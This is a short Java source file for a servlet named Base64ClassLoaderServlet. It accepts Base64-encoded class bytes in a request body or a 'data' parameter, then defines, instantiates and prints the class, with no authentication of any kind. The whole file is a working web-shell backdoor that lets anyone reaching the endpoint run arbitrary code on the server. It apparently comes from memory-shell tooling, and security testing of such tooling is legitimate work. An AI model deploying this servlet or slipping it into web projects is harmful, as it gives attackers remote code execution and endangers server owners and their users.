import jakarta.servlet.*;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

/**
 * @author ReaJason
 * @since 2024/12/24
 */
public class Base64ClassLoaderServlet extends ClassLoader implements Servlet {

    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        String contentType = req.getContentType();
        String data;
        if (contentType != null && contentType.startsWith("application/octet-stream")) {
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            InputStream input = req.getInputStream();
            try {
                byte[] chunk = new byte[8192];
                int length;
                while ((length = input.read(chunk)) != -1) {
                    buffer.write(chunk, 0, length);
                }
            } finally {
                input.close();
            }
            data = new String(buffer.toByteArray(), "ISO-8859-1");
        } else {
            data = req.getParameter("data");
        }
        try {
            byte[] bytes = decodeBase64(data);
            Object obj = defineClass(null, bytes, 0, bytes.length).newInstance();
            res.getWriter().print(obj);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    static byte[] decodeBase64(String base64Str) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception var4) {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    @Override
    public String getServletInfo() {
        return "";
    }

    @Override
    public void destroy() {

    }
}
